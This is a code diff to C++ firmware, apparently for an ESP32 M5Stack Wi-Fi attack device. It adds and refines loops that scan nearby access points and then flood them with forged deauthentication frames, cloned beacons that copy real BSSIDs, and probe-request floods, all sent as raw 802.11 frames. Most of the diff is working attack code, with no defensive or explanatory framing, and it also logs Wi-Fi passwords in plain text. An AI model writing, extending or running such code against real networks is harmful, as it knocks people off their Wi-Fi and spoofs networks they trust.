@@ -123,8 +123,22 @@ public:
 		led.flash();
 	}
 
-	void scanNetworks()
-	{
+	void probeAPloop() {
+		loop_probe_ap = !loop_probe_ap;
+
+		l.log(Logger::INFO, loop_probe_ap ? "Starting access point probe attack loop" : "Stopping access point probe attack loop");
+
+		if (!loop_probe_ap) 
+			return led.flash(2);
+		
+		if (!updateScanAp()) 
+			return l.log(Logger::ERROR, "Failed to scan nearby AP to deauth");
+
+		esp_wifi_set_mode(WIFI_MODE_AP);
+		led.flash();
+	}
+
+	void scanNetworks() {
 		led.flash();		
 
 		if (!updateScanAp()) {
@@ -148,20 +162,35 @@ public:
 		led.flash(2);
 	}
 
-	void createAccessPoint(const char *apName, const char *apPassword)
-	{
-		WiFi.softAP(apName, apPassword);
+	void scanNetworksRender() {
+		M5.Lcd.setTextColor(WHITE, BLACK);
+		M5.Lcd.setTextSize(1);
+
+		int offset = 25;
+		for (int i = 0; i < scanned_ap_count; i++) {
+			if (scanned_ap[i].bssid == nullptr) break;
+
+			M5.Lcd.setCursor(5, offset);
+
+			M5.Lcd.print("(" + String((int)scanned_ap[i].rssi) + ") " +scanned_ap[i].ssid + ": " + scanned_ap[i].bssid_str);
+
+			offset += 10;
+		}
 	}
 
-	void connectToWiFi(const char *ssid, const char *password)
-	{
+	void createAccessPoint(String apName, String apPassword) {
+		WiFi.softAP(apName, apPassword);
+		l.log(Logger::INFO, "Creating WiFi soft AP as" + apName + " with password \"" + apPassword + "\"");
+	}
+
+	void connectToWiFi(String ssid, String password) {
 		WiFi.begin(ssid, password);
 		while (WiFi.status() != WL_CONNECTED)
 		{
 			delay(1000);
-			Serial.println("Connecting to WiFi...");
+			l.log(Logger::INFO, "Connecting to WiFi " + ssid + " with password \"" + password + "\"");
 		}
-		Serial.println("Connected to WiFi.");
+		l.log(Logger::INFO, "Connected to WiFi " + ssid + "!");
 	}
 
 	void loop() {
@@ -175,10 +204,6 @@ public:
 				if (scanned_ap[i].bssid == nullptr) break;
 				String ssid = scanned_ap[i].ssid;
 
-				// for (int i = 0; i < ssid.length(); i++) {
-				// 	if (rand() % 2 == 0) 
-				// 		ssid += "\0"
-				// }
 				ssid += utilities::gen_random_str(1);
 
 				beacon(ssid);
@@ -191,20 +216,50 @@ public:
 				String ssid = scanned_ap[i].ssid;
 				uint8_t* bssid = scanned_ap[i].bssid;
 
+				#ifdef DEV
+				{
+					String bssid_s = scanned_ap[i].bssid_str;
+					l.log(Logger::INFO, "Sending cloned AP as " + ssid + " (" + bssid_s + ")");
+				}
+				#endif
+
 				beacon(ssid, bssid);
 			}
 		}
 
-		if (loop_deauth_ap && (last_update < millis())) { // every 1s
+		if (loop_probe_ap) { // every tick, is it meant to flood the AP?
 			for (int i = 0; i < scanned_ap_count; i++) {
 				if (scanned_ap[i].bssid == nullptr) break;
 
-				String ssid = scanned_ap[i].ssid;
-				String bssid_s = scanned_ap[i].bssid_str;
+				#ifdef DEV
+				{
+					String ssid = scanned_ap[i].ssid;
+					String bssid_s = scanned_ap[i].bssid_str;
+					l.log(Logger::INFO, "Sending probe request to " + ssid + " (" + bssid_s + ")");
+				}
+				#endif
+
+				uint8_t* bssid = scanned_ap[i].bssid;
+
+				probe(bssid);
+			}
+		}
+
+		if (loop_deauth_ap && (last_update - 500 < millis())) { // every 1s
+			for (int i = 0; i < scanned_ap_count; i++) {
+				if (scanned_ap[i].bssid == nullptr) break;
+
+				#ifdef DEV
+				{
+					String ssid = scanned_ap[i].ssid;
+					String bssid_s = scanned_ap[i].bssid_str;
+					l.log(Logger::INFO, "Deauthing " + ssid + " (" + bssid_s + ")");
+				}
+				#endif
+
 				uint8_t* bssid = scanned_ap[i].bssid;
 
 				deauth(bssid);
-				l.log(Logger::INFO, "Deauthing " + ssid + " (" + bssid_s + ")");
 			}
 		}
 
@@ -212,17 +267,19 @@ public:
 			last_update = millis() + 1000;
 	}
 
+public:
+	bool loop_spam_ap = false;
+	bool loop_rogue_ap = false;
+	bool loop_probe_ap = false;
+	bool loop_deauth_ap = false;
+	bool loop_clone_spam_ap = false;
 private:
 	int current_channel = 0;
 	wifi_init_config_t cfg;
     wifi_config_t ap_config;
 	ap scanned_ap[10]; // max 10 ap in the array
-	int scanned_ap_count = 10; // hardcode
 	uint8_t original_mac_ap[6];
-	bool loop_spam_ap = false;
-	bool loop_clone_spam_ap = false;
-	bool loop_rogue_ap = false;
-	bool loop_deauth_ap = false;
+	int scanned_ap_count = 10; // hardcoded
 	int last_update = 0;
 
 	void switchChannel() {
@@ -268,7 +325,7 @@ private:
 		return numNetworks != 0;
 	}
 
-	void beacon(String ssid, uint8_t* bssid) {
+	void beacon(String ssid, uint8_t bssid[6]) {
 		int ssidLen = ssid.length();
 
 		if (ssidLen > 32)
@@ -276,16 +333,12 @@ private:
 
 		switchChannel();
 
-		// uint8_t mac[6];
-		// sscanf(bssid.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
 		
 		// Create a buffer for the packet
 		uint8_t buffer[beacon_packet_size];
-		// Copy the packet to the buffer
 		memcpy(buffer, beacon_packet, beacon_packet_size);
 
 		// Write the MAC address to the packet
-		// const char* bssid_c = bssid.c_str();
 		memcpy(&buffer[10], bssid, 6);
 		memcpy(&buffer[16], bssid, 6);
 
@@ -293,12 +346,9 @@ private:
 		const char* ssid_c = ssid.c_str();
 		memcpy(&buffer[38], ssid_c, ssidLen);
 
-		// Write the channel to the packet
 		buffer[82] = current_channel;
 		// Write the RSN information to the packet
 		buffer[34] = 0x31; // wpa2
-
-		// delete[] mac;
 
 		// printBuffer(buffer, beacon_packet_size);
 
@@ -318,25 +368,17 @@ private:
 
 		uint8_t* mac = utilities::rand_mac();
 		
-		// Create a buffer for the packet
 		uint8_t buffer[beacon_packet_size];
-		// Copy the packet to the buffer
 		memcpy(buffer, beacon_packet, beacon_packet_size);
 
-		// Write the MAC address to the packet
 		memcpy(&buffer[10], mac, 6);
 		memcpy(&buffer[16], mac, 6);
 
-		// Write the SSID to the packet
 		const char* ssid_c = ssid.c_str();
 		memcpy(&buffer[38], ssid_c, ssidLen);
 
-		// Write the channel to the packet
 		buffer[82] = current_channel;
-		// Write the RSN information to the packet
 		buffer[34] = 0x31; // wpa2
-
-		// delete[] mac;
 
 		for (int i = 0; i < 3; i++) {
 			esp_wifi_80211_tx(WIFI_IF_STA, buffer, beacon_packet_size, 0);
@@ -344,7 +386,7 @@ private:
 		}
 	}
 
-	void deauth(uint8_t* bssid) {
+	void deauth(uint8_t bssid[6]) {
 		switchChannel();
 
 		uint8_t buffer[deauth_packet_size];
@@ -368,7 +410,7 @@ private:
 		esp_wifi_80211_tx(WIFI_IF_AP, buffer, deauth_packet_size, false);
 	}
 
-	void probe(const char* bssid) {
+	void probe(uint8_t bssid[6]) {
 		switchChannel();
 
 		uint8_t buffer[probe_packet_size];
@@ -377,11 +419,13 @@ private:
 		uint8_t* mac = utilities::rand_mac();
 
 		memcpy(&buffer[10], mac, 6);
+		memcpy(&buffer[26], bssid, 6);
 
-		sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
-				&buffer[26], &buffer[27], &buffer[28], &buffer[29], &buffer[30], &buffer[31]);
-
-		delete[] mac;
+		/**
+		 * @brief before with a cosnt char*
+		 * sscanf(bssid, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
+		 *		&buffer[26], &buffer[27], &buffer[28], &buffer[29], &buffer[30], &buffer[31]);
+		 */
 
 		esp_wifi_80211_tx(WIFI_IF_AP, buffer, probe_packet_size, false);
 	}
